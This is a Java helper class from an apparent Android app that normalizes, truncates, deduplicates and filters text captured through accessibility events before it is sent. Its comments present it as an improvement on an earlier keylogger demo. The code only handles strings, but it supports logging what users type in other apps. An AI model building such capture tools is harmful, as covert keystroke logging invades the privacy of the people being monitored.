package com.example.setup;

import java.util.List;

/**
 * Pure (Android-free) normalization and filtering for captured text.
 * Extracted so it can be unit-tested on the JVM; SafetyService feeds it the
 * raw values from AccessibilityEvent.
 *
 * Improvements over the Dliv3 demo:
 *  - never report password fields
 *  - bound payload size
 *  - collapse whitespace but keep the user's actual characters (the old
 *    logger and our v1.2 stripped every '[' and ']', corrupting searches)
 *  - suppress consecutive duplicates from focus + text-change pairs
 */
public final class TypingPayload {

    public static final int MAX_CHARS = 500;

    private TypingPayload() {}

    /** AccessibilityEvent.getText() is a List<CharSequence>; also accepts a plain string. */
    public static String normalize(List<?> parts) {
        if (parts == null || parts.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();
        for (Object p : parts) {
            if (p == null) continue;
            if (sb.length() > 0) sb.append(' ');
            sb.append(p);
        }
        return normalize(sb.toString());
    }

    public static String normalize(String raw) {
        if (raw == null) return "";
        // Collapse every whitespace run (space, tab, CR/LF) to one space.
        String s = raw.replaceAll("\\s+", " ").trim();
        if (s.length() > MAX_CHARS) s = s.substring(0, MAX_CHARS);
        return s;
    }

    /** Password if the event OR its source node is flagged as a password field. */
    public static boolean isPassword(boolean eventFlag, Boolean nodeFlag) {
        return eventFlag || Boolean.TRUE.equals(nodeFlag);
    }

    /** Consecutive-duplicate key, scoped per app; null-safe. */
    public static String key(String pkg, String text) {
        return (pkg == null ? "" : pkg) + "\u0000" + normalize(text);
    }

    /** Final gate before sending: no passwords, no empty text, no exact repeat. */
    public static boolean shouldSend(String text, String pkg, boolean password, String lastKey) {
        if (password || text == null) return false;
        String t = normalize(text);
        if (t.isEmpty()) return false;
        return !key(pkg, t).equals(lastKey);
    }
}
